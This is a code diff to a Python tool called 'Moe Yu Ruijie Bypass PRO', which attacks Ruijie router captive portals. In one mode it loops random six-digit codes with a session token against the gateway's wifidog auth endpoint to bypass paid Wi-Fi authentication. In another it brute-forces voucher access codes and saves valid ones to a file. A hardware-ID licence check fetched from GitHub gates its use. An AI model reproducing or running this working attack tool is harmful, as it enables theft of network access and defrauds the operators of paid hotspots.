@@ -19,9 +19,15 @@ import argparse
 import marshal
 import subprocess
 from datetime import datetime
+from urllib.parse import quote
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+from Crypto.Random import get_random_bytes
+from concurrent.futures import ThreadPoolExecutor
 
 # --- CONFIGURATION (Moe Yu's Database) ---
 KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"
+ID_STORAGE = ".moe_yu_id" # ID ကို အသေသိမ်းမည့်ဖိုင်
 
 # Colors
 w, g, y, r, b, c = "\033[1;37m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m"
@@ -33,24 +39,21 @@ def Line():
     print(f"{y}─" * os.get_terminal_size()[0])
 
 def get_hwid():
-    """
-    Termux ရဲ့ Installation Path ကို အခြေခံပြီး ID ထုတ်ခြင်း။
-    ဒါက Termux ကို မဖျက်မချင်း လုံးဝ (လုံးဝ) မပြောင်းလဲတဲ့ ID မျိုးကို ရစေမှာပါ။
-    """
-    try:
-        # Termux ရဲ့ ပုံသေ Path ကို ယူပါတယ်
-        path = os.environ.get('PREFIX', '/data/data/com.termux/files/usr')
-        # အဲဒီ Path ကို Hash လုပ်ပြီး ID အဖြစ် သုံးပါမယ်
-        raw_id = hashlib.sha256(path.encode()).hexdigest()[:20].upper()
-        # ပိုစိတ်ချရအောင် စက်ရဲ့ node (MAC) နဲ့ ပေါင်းပါမယ်
+    """ID ကို ဖိုင်ထဲတွင် အသေသိမ်းဆည်းသောစနစ် (ဘယ်တော့မှ မပြောင်းပါ)"""
+    if os.path.exists(ID_STORAGE):
+        with open(ID_STORAGE, "r") as f:
+            return f.read().strip()
+    else:
+        # ပထမဆုံးအကြိမ်တွင်သာ Hardware အခြေခံ၍ ID အသစ်ထုတ်ပြီး သိမ်းမည်
         node = str(uuid.getnode())
-        final_id = hashlib.md5(f"{raw_id}-{node}".encode()).hexdigest().upper()
-        return final_id
-    except:
-        return hashlib.md5(str(uuid.getnode()).encode()).hexdigest().upper()
+        new_id = hashlib.md5(node.encode()).hexdigest().upper()
+        with open(ID_STORAGE, "w") as f:
+            f.write(new_id)
+        return new_id
 
 def Logo():
     clear()
+    my_id = get_hwid()
     logo = f"""{r}
  ███▄           ▄████▄   ▓█████  ██   ██  ██   ██ 
  ▓██ ▀█▄       ▒██    ▀  ▓█   ▀  ▒██  ██▒ ▒██  ██▒
@@ -66,14 +69,15 @@ def Logo():
     print(logo)
     Line()
     print(f"{g}  [👤] {w}Dev      : {y}@moeyu")
-    print(f"{g}  [🆔] {w}Fixed ID : {c}{get_hwid()}")
+    print(f"{g}  [🆔] {w}Fixed ID : {c}{my_id}")
     print(f"{g}  [🛡️] {w}Target   : {r}Ruijie Router Only")
     Line()
 
 def check_key():
+    """Permanent License Check via GitHub"""
     my_id = get_hwid()
     Logo()
-    print(f"{y}[*] Verifying Locked License...{w}")
+    print(f"{y}[*] Initializing Secure License System...{w}")
     try:
         res = requests.get(KEY_URL, timeout=15)
         if res.status_code == 200:
@@ -86,18 +90,20 @@ def check_key():
                         expiry = datetime.strptime(exp_str.strip(), "%Y-%m-%d").date()
                         if today <= expiry:
                             days_left = (expiry - today).days
-                            print(f"{g}[+] Access Granted! ({days_left} days left){w}")
+                            print(f"{g}[+] License Valid! ({days_left} days left){w}")
                             time.sleep(1.5)
                             return True
                         else:
-                            print(f"{r}[!] KEY EXPIRED!{w}")
+                            print(f"{r}[!] YOUR LICENSE HAS EXPIRED!{w}")
+                            print(f"{y}[>] Expired on: {exp_str}")
                             sys.exit()
             
-            print(f"{r}[!] UNREGISTERED ID!{w}")
-            print(f"{y}[>] Fixed ID: {c}{my_id}{w}")
+            print(f"{r}[!] UNREGISTERED DEVICE ID!{w}")
+            print(f"{y}[>] Your ID: {c}{my_id}{w}")
+            print(f"{y}[>] Send this ID to @moeyu for activation.")
             sys.exit()
     except:
-        print(f"{r}[!] Database Connection Error!{w}")
+        print(f"{r}[!] Connection Failed! Check your internet.")
         sys.exit()
 
 async def get_session_id(session, session_url, prev_id):
@@ -115,20 +121,20 @@ class InternetAccess:
 
     async def execute(self):
         Logo()
-        print(f"{y}[*] Running Bypass Loop...{w}")
+        print(f"{y}[*] Bypassing Ruijie Gateways...{w}")
         async with aiohttp.ClientSession() as session:
-            loop_idx = 0
+            loop_count = 0
             while True:
-                if loop_idx % 5 == 0: sid = await get_session_id(session, self.session_url, None)
+                if loop_count % 5 == 0: sid = await get_session_id(session, self.session_url, None)
                 code = "".join(random.choice(string.digits) for _ in range(6))
                 try:
                     async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as res:
                         p = await asyncio.to_thread(ping3.ping, 'google.com')
-                        p_fmt = f"{g}{int(p*1000)}ms" if p else f"{r}Timeout"
-                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass: {res.status} | Ping: {p_fmt}")
+                        p_fmt = f"{g}{int(p*1000)}ms" if p else f"{r}Lost"
+                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass Active {w}| Status: {res.status} | Ping: {p_fmt}")
                 except: pass
                 await asyncio.sleep(1)
-                loop_idx += 1
+                loop_count += 1
 
 class VoucherCode:
     def __init__(self, mode, length, speed):
@@ -138,7 +144,7 @@ class VoucherCode:
 
     async def start(self):
         Logo()
-        print(f"{g}[+] Bruteforce Starting...{w}")
+        print(f"{g}[+] Bruteforce Starting... Mode: {self.mode}{w}")
         Line()
         async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.speed)) as session:
             loop_idx = 0
@@ -149,13 +155,13 @@ class VoucherCode:
                 try:
                     async with session.post(url, json={"accessCode": v, "sessionId": sid, "apiVersion": 1}) as req:
                         if 'logonUrl' in await req.text():
-                            print(f"{g}[+] FOUND: {v}{w}")
+                            print(f"{g}[+] FOUND VALID VOUCHER: {v}{w}")
                             with open("success.txt", "a") as f: f.write(f"{v}\n")
                 except: pass
                 loop_idx += 1
 
 def feature():
-    parser = argparse.ArgumentParser()
+    parser = argparse.ArgumentParser(description="Moe Yu Ruijie Bypass PRO")
     parser.add_argument("-o", "--option", choices=["code", "internet", "setup"], required=True)
     parser.add_argument("-m", "--mode", choices=["digit", "ascii"], default="digit")
     parser.add_argument("-l", "--length", type=int, default=6)
@@ -171,8 +177,8 @@ def feature():
             sid_url = "https://portal-as.ruijienetworks.com" + re.search("href='(.*?)'</script>", portal).group(1)
             with open(".session_url", "w") as f: f.write(sid_url)
             with open(".ip", "w") as f: f.write(gw)
-            print(f"{g}[+] Setup Success! Your ID is now Fixed.{w}")
-        except: print(f"{r}[!] Connection Failed.")
+            print(f"{g}[+] Setup Completed! ID is now Locked.{w}")
+        except: print(f"{r}[!] Connection Failed. Connect to Router WiFi.")
     elif args.option == "internet":
         asyncio.run(InternetAccess().execute())
     elif args.option == "code":
@@ -181,4 +187,4 @@ def feature():
 if __name__ == "__main__":
     if check_key():
         try: feature()
-        except KeyboardInterrupt: print(f"\n{r}[!] Stopped.{w}")
+        except KeyboardInterrupt: print(f"\n{r}[!] Stopped by user.{w}")
